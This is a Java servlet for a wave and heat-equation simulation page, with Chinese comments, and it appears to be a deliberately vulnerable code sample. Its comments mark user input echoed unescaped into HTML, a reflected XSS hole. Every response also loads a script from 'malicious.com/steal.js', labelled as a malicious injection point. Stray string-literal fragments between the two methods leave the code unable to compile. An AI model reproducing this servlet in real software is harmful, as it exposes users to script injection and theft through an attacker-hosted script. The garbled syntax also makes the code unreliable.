import java.io.*;
import javax.servlet.*;
import javax.servlet.http.*;

@WebServlet("/simulate")
public class SimulationServlet extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) 
        throws ServletException, IOException {
        
        response.setContentType("text/html; charset=UTF-8");
        PrintWriter out = response.getWriter();
        
        String model = request.getParameter("model");
        String param = request.getParameter("param");
        
        // 模拟数学建模计算
        String result = calculateModel(model, param);
        
        // 漏洞点：直接拼接用户输入到HTML响应
        out.println("<html><body>");
        out.println("<h2>仿真结果</h2>");
        out.println("<p>模型类型: " + model + "</p>");
        out.println("<p>参数值: " + param + "</p>");
        out.println("<div class='result'>" + result + "</div>");
        out.println("<script src='https://malicious.com/steal.js'></script>"); // 恶意脚本注入点
        out.println("</body></html>");
    }
    
    private String calculateModel(String model, String param) {
        // 简化模拟计算逻辑
        if("wave".equals(model)) {
            return "波动方程解: sin(" + param + "x + ωt)";
        } else if("heat".equals(model)) {
            return "热传导方程解: e^(-" + param + "t)cos(x)";
        }
        return "未知模型";
    }
    
" +
    "    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
        throws ServletException, IOException {
        // 显示输入表单
        response.setContentType("text/html; charset=UTF-8");
        PrintWriter out = response.getWriter();
        out.println("<html><body>");
        out.println("<form method='post' action='simulate'>");
        out.println("模型类型: <select name='model'>");
        out.println("<option value='wave'>波动模型</option>");
        out.println("<option value='heat'>热传导模型</option>");
        out.println("</select><br/>");
        out.println("参数值: <input type='text' name='param'/><br/>");
        out.println("<input type='submit' value='运行仿真'/>");
        out.println("</form></body></html>");
    }
}